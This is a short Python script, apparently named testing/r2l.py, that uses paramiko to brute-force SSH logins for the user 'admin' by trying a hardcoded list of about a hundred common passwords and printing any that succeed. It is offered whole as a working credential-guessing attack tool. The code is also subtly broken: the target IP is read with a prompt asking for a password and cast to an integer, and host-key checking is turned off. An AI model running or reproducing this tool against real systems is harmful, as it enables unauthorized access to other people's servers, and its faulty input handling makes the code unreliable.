# testing/r2l.py
import paramiko

target_ip = int(input('enter the password'))  # Change to your target IP
username = "admin"  # Target username
password_list = ["123456", "password", "123456789", "12345", "12345678", "qwerty", "1234567", "111111", "123123", "abc123",  
"password1", "1234", "iloveyou", "1q2w3e4r", "000000", "qwerty123", "zaq12wsx", "dragon", "sunshine", "princess",  
"letmein", "654321", "monkey", "27653", "superman", "1qaz2wsx", "trustno1", "asdfgh", "football", "jordan23",  
"hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "charlie", "michael", "jennifer",  
"shadow", "master", "mustang", "666666", "qazwsx", "121212", "password123", "welcome", "login", "admin",  
"abc123456", "qwertyuiop", "princess1", "solo", "starwars", "passw0rd", "qwert", "mypass", "baseball", "hello",  
"freedom", "whatever", "letmein123", "6543210", "pokemon", "nothing", "1q2w3e", "123qwe", "zxcvbnm", "asdf",  
"asdf1234", "pa55word", "hello123", "welcome1", "root", "blink182", "trustnoone", "ninja", "nathan", "thomas",  
"jesus", "cheese", "fuckyou", "monkey123", "secret", "donald", "liverpool", "william", "pass", "maggie",  
"peanut", "maverick", "cookie", "pepper", "ashley", "banana", "ginger", "silver", "summer", "buster1",  
"cookie123", "test", "admin123", "welcome123", "hockey", "123abc",
]  # Common passwords

def ssh_brute_force(target_ip, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            print(f"Trying password: {password}")
            client.connect(target_ip, username=username, password=password, timeout=1)
            print(f"[+] Successful Login: {username}:{password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            print("[-] Login Failed")
        except Exception as e:
            print(f"Error: {e}")
            break

    print("[-] Brute Force Attack Finished")

ssh_brute_force(target_ip, username, password_list)
